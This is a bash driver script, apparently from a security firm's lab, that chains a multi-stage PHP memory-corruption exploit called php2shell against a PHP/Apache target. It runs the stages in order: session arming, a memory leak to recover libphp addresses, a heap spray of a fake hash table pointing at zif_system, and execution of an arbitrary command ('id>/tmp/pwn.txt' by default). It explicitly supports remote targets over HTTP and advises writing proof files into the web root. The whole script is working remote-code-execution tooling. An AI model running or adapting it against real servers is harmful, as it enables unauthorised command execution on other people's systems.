#!/bin/bash
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 GG ADVANCED IT Security UG

# chain.sh - the whole php2shell chain with our own tools, one target, one proof file.
#
#   chain.sh --target http://127.0.0.1:18110/index.php --container p2s-target
#   chain.sh --target https://host/index.php --probe /probe.php --proof-url https://host/pwn.txt
#
# Steps: A1 arms the stale session id, B1 discloses 800 KB out of the recycled chunk, leak_addrs
# turns that into libphp/main/S/hsv, A2 re-arms with the cheap OOM, B2 sprays the fake reference and
# the fake array. The proof is a command run by the target's user.
#
# Nothing here needs the container: without one the symbols come from the arch profile (probe.php or
# the leak says which arch), the gate judges on the A1 HTTP outcome, and the proof is fetched over
# HTTP when --proof-url or a relative --proof is given. A container, when there is one, is only used
# to read the log and the file - both are better evidence, so they win when available.
#
# Exit codes: 0 chain verified and the proof file was read
#             2 preflight refused the target, a step failed, or the proof could not be read
#             5 preflight says the build arms but cannot disclose (8.5.11)
#             6 --allow-arming-only: the gate passed and the run stopped there on purpose
#             7 the proof was read, but arming is only inferred (no container log)
set -u

TARGET="http://127.0.0.1:18110/index.php"
CONTAINER="${CONTAINER:-${NAME:-p2s-target}}"
CMD='id>/tmp/pwn.txt'
PROOF="/tmp/pwn.txt"
PROOF_URL=""       # where to fetch the proof from over HTTP, when the target serves it
SPEC="G:511:0x137*14,G:400:0x137,X:900"
PARTS=880
DEPTH=64
FILLERS=""          # empty = take it from the arch profile (the arming shape is a build constant)
FILLERS_CLI=""
WORKERS=0          # >1: hold WORKERS-1 connections so every step lands on the same child
SYMBOLS=""         # empty = resolve from the arch profile, or from the image's own symbol table
ARCH="auto"        # auto = ask probe.php, then read it out of the leak
PHP_VERSION="8.4.26"
DISTRO=""          # from probe.php: a package build needs its own offsets, not the image's
SPRAY_FIRST=""     # override for the fake-reference phase inside a spray value
PROBE=""           # path of a deployed probe.php, an input to the preflight
SKIP_PREFLIGHT=0
ALLOW_UNVERIFIED=0 # gate: continue when A1 looks armed but cannot be confirmed
ALLOW_ARMING_ONLY=0 # preflight: accept an arming-only build (8.5.11) and stop after the gate
STOP_AFTER_GATE=0   # implied by --allow-arming-only
GATE_INFERRED=0

while [ $# -gt 0 ]; do
  case "$1" in
    --target) TARGET="$2"; shift 2 ;;
    --container) CONTAINER="$2"; shift 2 ;;
    --cmd) CMD="$2"; shift 2 ;;
    --proof) PROOF="$2"; shift 2 ;;
    --proof-url) PROOF_URL="$2"; shift 2 ;;
    --parts) PARTS="$2"; shift 2 ;;
    --depth) DEPTH="$2"; shift 2 ;;
    --fillers) FILLERS_CLI="$2"; shift 2 ;;
    --workers) WORKERS="$2"; shift 2 ;;
    --symbols) SYMBOLS="$2"; shift 2 ;;
    --arch) ARCH="$2"; shift 2 ;;
    --php-version) PHP_VERSION="$2"; shift 2 ;;
    --distro) DISTRO="$2"; shift 2 ;;
    --spray-first) SPRAY_FIRST="$2"; shift 2 ;;
    --probe) PROBE="$2"; shift 2 ;;
    --skip-preflight) SKIP_PREFLIGHT=1; shift ;;
    --allow-unverified) ALLOW_UNVERIFIED=1; shift ;;
    --allow-arming-only) ALLOW_ARMING_ONLY=1; STOP_AFTER_GATE=1; shift ;;
    *) echo "unknown argument $1" >&2; exit 2 ;;
  esac
done

HERE="$(cd "$(dirname "$0")" && pwd)"
COOKIE=$(mktemp)
A1OUT=""
GATEOUT=""
HOLDER=""
REMOTE=0


# Fail before the first stage rather than after it: four requests against nothing produce four
# confusing errors, and the interesting one is always the first.
python3 -c '
import socket, sys
url = sys.argv[1].split("://", 1)[-1].split("/", 1)[0]
host, _, port = url.partition(":")
try:
    socket.create_connection((host, int(port or 80)), timeout=3).close()
except OSError as exc:
    sys.exit("no target on %s (%s)" % (url, exc.strerror or exc))
' "$TARGET" || exit 1

# Answer the cheap compatibility questions before spending the body: the chain is tied to one build
# family and one SAPI, and anything else fails in the middle in a way that reads like a broken exploit.
if [ "$SKIP_PREFLIGHT" = 1 ]; then
  echo "preflight: skipped"
else
  PF_ARGS=(--url "$TARGET")
  [ -n "$PROBE" ] && PF_ARGS+=(--probe "$PROBE")
  [ "$ALLOW_ARMING_ONLY" = 1 ] && PF_ARGS+=(--allow-arming-only)
  python3 "$HERE/preflight.py" "${PF_ARGS[@]}"
  PF_RC=$?
  if [ "$PF_RC" = 5 ]; then
    # Arming reproduces here, disclosure does not, so a chain run can only fail at B1. That is worth
    # knowing on purpose -- it is how the arming instrument is validated -- but not by accident.
    echo "[!] this build arms but cannot disclose: B1 has nothing to leak" >&2
    echo "    re-run with --allow-arming-only to verify the arming instrument and stop after the gate," >&2
    echo "    or with --skip-preflight to try the whole chain anyway" >&2
    exit 5
  elif [ "$PF_RC" != 0 ]; then
    echo "[!] preflight failed - re-run with --skip-preflight to try anyway" >&2
    exit 2
  fi
fi

# Is there a container to reach into? If not, the log, the symbol table and the proof all have to come
# from the target itself. That is the remote case and it is not an error: every stage is HTTP anyway.
if ! docker inspect -f '{{.State.Running}}' "$CONTAINER" >/dev/null 2>&1; then
  REMOTE=1
  echo "no container access to '$CONTAINER': log, symbols and proof are taken from the target" >&2
fi

# Symbols, best source first: an explicit table, the running image's own nm, then the arch profile. The
# profile keys on the architecture, which probe.php reports and the leak also reveals - the build number
# alone cannot say it, and a wrong guess is tens of MB off.
if [ "$ARCH" = auto ] && [ -n "$PROBE" ]; then
  _facts=$(python3 "$HERE/probe_facts.py" "$TARGET" "$PROBE" 2>/dev/null) || _facts=""
  if [ -n "$_facts" ]; then
    ARCH="${_facts%%	*}"
    _rest="${_facts#*	}"
    [ -n "${_rest%%	*}" ] && PHP_VERSION="${_rest%%	*}"
    [ -n "${_rest#*	}" ] && [ "${_rest#*	}" != "$_rest" ] && DISTRO="${_rest#*	}"
  fi
fi
if [ -z "$SYMBOLS" ] && [ "$REMOTE" = 0 ]; then
  # Module name differs by build: the official image ships libphp.so, a distro package libphp8.4.so or
  # libphp8.3.so. Distro builds are stripped of .symtab, so three of the four symbols only exist in the
  # dynamic table; zif_system is static and comes from the profile instead.
  SYMBOLS=$(docker exec "$CONTAINER" sh -c \
    'for M in /usr/lib/apache2/modules/libphp*.so /usr/local/lib/libphp.so; do [ -f "$M" ] && { nm "$M" 2>/dev/null; nm -D "$M" 2>/dev/null; break; }; done' \
    2>/dev/null | awk '
      $3 == "zval_ptr_dtor"     { a = $1 }
      $3 == "zif_system"        { b = $1 }
      $3 == "zend_hash_destroy" { c = $1 }
      END {
        s = ""; n = 0
        if (a) { s = s (n++ ? "," : "") "zval_ptr_dtor=0x" a }
        if (b) { s = s (n++ ? "," : "") "zif_system=0x" b }
        if (c) { s = s (n++ ? "," : "") "zend_hash_destroy=0x" c }
        print s
      }')
  [ -z "$SYMBOLS" ] && echo "warning: $CONTAINER has no usable symbol table" >&2
fi
SYM_ARGS=(--arch "$ARCH" --php-version "$PHP_VERSION")
[ -n "$DISTRO" ] && SYM_ARGS+=(--distro "$DISTRO")
if [ -n "$SYMBOLS" ]; then
  _old_ifs="$IFS"; IFS=','
  for _pair in $SYMBOLS; do
    SYM_ARGS+=(--symbol "$_pair")
  done
  IFS="$_old_ifs"
  echo "symbols: $SYMBOLS"
else
  _profile=$(python3 -c 'import sys; from decode_leak_cookie import profile_key; print(profile_key(sys.argv[1], sys.argv[2], sys.argv[3]))' \
    "$ARCH" "$PHP_VERSION" "$DISTRO" 2>/dev/null)
  echo "symbols: profile ${_profile:-$ARCH/$PHP_VERSION}"
fi

cleanup() {
  rm -f "$COOKIE" "$A1OUT" "$GATEOUT"
  if [ -n "$HOLDER" ]; then
    kill "$HOLDER" 2>/dev/null
    wait "$HOLDER" 2>/dev/null
  fi
}
trap cleanup EXIT

if [ "$WORKERS" -gt 1 ]; then
  python3 "$HERE/hold_workers.py" --url "$TARGET" --count "$((WORKERS - 1))" --hold 180 &
  HOLDER=$!
  # The pool needs about 10 s to reach its ceiling with 149 connections held (9 -> 101 -> 151 processes
  # at 2, 5 and 10 s), so 3 s catches it mid-ramp - and it sheds held connections again after ~20 s.
  # No settle makes the race go away: the replay measured 2/10 proof across 3-40 s. For a deterministic
  # run use the single-worker target, where the same chain measured 5/5.
  sleep 3
fi

# A1 output is kept in a file: the gate needs the whole thing (status, OOM text, socket outcome), not
# a two-line preview. The log timestamp slices the container log to this run so an older OOM line
# cannot be mistaken for this one.
A1OUT=$(mktemp)
A1SINCE=$(date -u +%Y-%m-%dT%H:%M:%SZ)
python3 "$HERE/a1_arm.py" --url "$TARGET" --repeat 1 --sid-hex 00 --big 78 \
        --query-n 5 --query-len 1 --timeout 120 > "$A1OUT"
grep -E '^  attempt |socket:|tried to allocate' "$A1OUT" | head -3

GATE_ARGS=(--a1-output "$A1OUT" --since "$A1SINCE")
[ -n "$CONTAINER" ] && [ "$REMOTE" = 0 ] && GATE_ARGS+=(--container "$CONTAINER")
[ "$REMOTE" = 1 ] && GATE_ARGS+=(--remote)
[ "$ALLOW_UNVERIFIED" = 1 ] && GATE_ARGS+=(--allow-unverified)
GATEOUT=$(mktemp)
python3 "$HERE/arming_gate.py" "${GATE_ARGS[@]}" > "$GATEOUT" 2>&1
GATE_RC=$?
cat "$GATEOUT"
if [ "$GATE_RC" != 0 ]; then
  exit "$GATE_RC"
fi
if grep -q '^armed (inferred)' "$GATEOUT"; then
  GATE_INFERRED=1
fi

if [ "$STOP_AFTER_GATE" = 1 ]; then
  echo
  echo "stopping after the gate: this build is expected to arm and not to disclose."
  echo "The arming instrument is verified; B1, A2 and B2 were not attempted."
  echo "exit 6 means 'as expected for this build', not 'the chain worked'."
  exit 6
fi
sleep 1

python3 "$HERE/b1_forge.py" --url "$TARGET" --spec "$SPEC" --fake-len 0xC8000 \
        --sid a --progress-first --chunked --save-cookie "$COOKIE" \
        | grep -E 'response|Set-Cookie' || exit 1

ADDRS=$(python3 "$HERE/leak_addrs.py" --cookie-file "$COOKIE" "${SYM_ARGS[@]}" --emit shell) || exit 1
eval "$ADDRS"
[ -n "$SPRAY_FIRST" ] && SPRAY_FIRST=$((SPRAY_FIRST))
[ -n "$FILLERS_CLI" ] && FILLERS="$FILLERS_CLI"
[ -z "$FILLERS" ] && FILLERS=115
echo "leak: libphp=$LIBPHP main=$MAIN S=$S hsv=$HSV zif=$ZIF_SYSTEM"
sleep 1

python3 "$HERE/a2_cheap_oom.py" --url "$TARGET" --parts "$PARTS" --depth "$DEPTH" \
        --fillers "$FILLERS"
sleep 1

HT=$(mktemp)
python3 "$HERE/mk_fake_ht.py" --ht "$S" --zif "$ZIF_SYSTEM" --cmd "$CMD" --out "$HT" --size "$VL"
B2OUT=$(python3 "$HERE/b2_exec.py" --url "$TARGET" --ht-addr "$S" --ht-file "$HT" --vl "$VL" \
        --n1 "$N1" --n2 495 --rc 1 --first "$SPRAY_FIRST" --sid a \
        $([ "${SID_FIELD:-1}" = 0 ] && echo --no-sid-field))
echo "$B2OUT"
rm -f "$HT"
# A successful fire ends with the worker dead, so the client sees the connection drop ("response=0"). An
# answered request means B2 landed on a child that never held the stale state - the pool is not sitting at
# the pinned count: it ramps up over the first ~10 s and starts shedding held connections after that.
case "$B2OUT" in
  *"response=0"*) ;;
  *) echo "[!] B2 was answered instead of dropping the connection: this request did not reach the child" >&2
     echo "    that held the stale session state. With more than one worker that is a pinning race -" >&2
     echo "    re-run, or use the single-worker target (lab/start_target.sh --single)." >&2 ;;
esac
sleep 2

echo "proof:"
PROVEN=0
if [ -n "$PROOF_URL" ]; then
  curl -fsS --max-time 15 "$PROOF_URL" && PROVEN=1
fi
if [ "$PROVEN" = 0 ] && [ "$REMOTE" = 0 ]; then
  # With a single Apache child the crash that ends the chain takes the container down, and then
  # `docker exec` cannot reach the file - `docker cp` can, because it works on a stopped container.
  if docker exec "$CONTAINER" sh -c "cat $PROOF" 2>/dev/null; then
    PROVEN=1
  elif docker cp "$CONTAINER:$PROOF" /dev/stdout 2>/dev/null; then
    PROVEN=1
  fi
fi
if [ "$PROVEN" = 0 ] && [ "${PROOF#/}" = "$PROOF" ]; then
  # A relative proof is a path the target serves, so it is fetched next to the entry point.
  _url="${TARGET%%\?*}"
  _url="${_url%/*}/$PROOF"
  echo "  (no container file; fetching $_url)"
  curl -fsS --max-time 15 "$_url" && PROVEN=1
fi
if [ "$PROVEN" = 0 ]; then
  echo "(proof file not readable: $PROOF)"
  echo "  remote targets: write it where the server serves it and pass the URL, e.g." >&2
  echo "    --cmd 'id>/var/www/html/pwn.txt' --proof pwn.txt --proof-url https://host/pwn.txt" >&2
  exit 2
fi

if [ "$GATE_INFERRED" = 1 ]; then
  echo
  echo "note: exit 7 - the proof is real, arming was only inferred (no container log to read the"
  echo "      allocation size from). --container <name> turns this back into a verified run."
  exit 7
fi
exit 0
